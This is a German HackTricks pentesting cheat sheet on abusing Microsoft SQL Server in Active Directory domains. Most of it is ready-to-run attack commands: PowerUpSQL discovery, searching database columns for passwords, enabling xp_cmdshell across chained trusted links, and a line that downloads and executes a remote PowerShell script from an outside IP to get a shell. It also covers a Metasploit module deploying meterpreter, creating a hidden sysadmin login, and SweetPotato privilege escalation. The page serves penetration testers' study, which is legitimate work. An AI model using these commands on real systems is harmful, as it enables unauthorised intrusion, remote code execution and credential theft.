# MSSQL AD Missbrauch

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

## **MSSQL Enumeration / Entdeckung**

Das PowerShell-Modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ist in diesem Fall sehr nützlich.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Enumerieren aus dem Netzwerk ohne Domänen-Sitzung
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Enumerieren innerhalb der Domäne
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL Grundlegender Missbrauch

### Zugriff auf die Datenbank
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Es könnte auch möglich sein, **Befehle** innerhalb des MSSQL-Hosts auszuführen
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL Grundlegende Hacking-Tricks

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Vertrauenswürdige Verknüpfungen

Wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz als vertrauenswürdig (Datenbankverknüpfung) angesehen wird. Wenn der Benutzer Berechtigungen für die vertrauenswürdige Datenbank hat, kann er **die Vertrauensbeziehung nutzen, um auch Abfragen in der anderen Instanz auszuführen**. Diese Vertrauensverhältnisse können verkettet werden, und an einem bestimmten Punkt könnte der Benutzer eine schlecht konfigurierte Datenbank finden, in der er Befehle ausführen kann.

**Die Verknüpfungen zwischen Datenbanken funktionieren sogar über Waldvertrauensstellungen hinweg.**

### Powershell Missbrauch
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Sie können ganz einfach vertrauenswürdige Links mit Metasploit überprüfen.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
### Manuell - Openquery()

Von **Linux** aus könnten Sie eine MSSQL-Konsole mit **sqsh** und **mssqlclient.py** erhalten.

Von **Windows** aus könnten Sie auch die Links finden und Befehle manuell mit einem **MSSQL-Client wie** [**HeidiSQL**](https://www.heidisql.com) ausführen.

_Anmeldung mit Windows-Authentifizierung:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Vertrauenswürdige Links finden
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (168).png>)

#### Führen Sie Abfragen über den vertrauenswürdigen Link aus

Führen Sie Abfragen über den Link aus (Beispiel: Finden Sie weitere Links in der neuen zugänglichen Instanz):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Überprüfen Sie, wo doppelte und einfache Anführungszeichen verwendet werden, es ist wichtig, sie auf diese Weise zu verwenden.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Sie können diese vertrauenswürdigen Links-Kette manuell endlos fortsetzen.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
### Handbuch - AUSFÜHREN

Sie können auch vertrauenswürdige Verknüpfungen mit der Methode `AUSFÜHREN` missbrauchen:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Lokale Privilege-Eskalation

Der **MSSQL-Local-User** hat in der Regel eine spezielle Art von Berechtigung namens **`SeImpersonatePrivilege`**. Dies ermöglicht dem Konto, "einen Client nach der Authentifizierung zu übernehmen".

Eine Strategie, die viele Autoren entwickelt haben, besteht darin, einen SYSTEM-Dienst dazu zu zwingen, sich bei einem von einem Angreifer erstellten Rogue- oder Man-in-the-Middle-Dienst zu authentifizieren. Dieser Rogue-Dienst kann dann den SYSTEM-Dienst imitieren, während er versucht, sich zu authentifizieren.

[SweetPotato](https://github.com/CCob/SweetPotato) enthält eine Sammlung dieser verschiedenen Techniken, die über den Befehl `execute-assembly` von Beacon ausgeführt werden können.
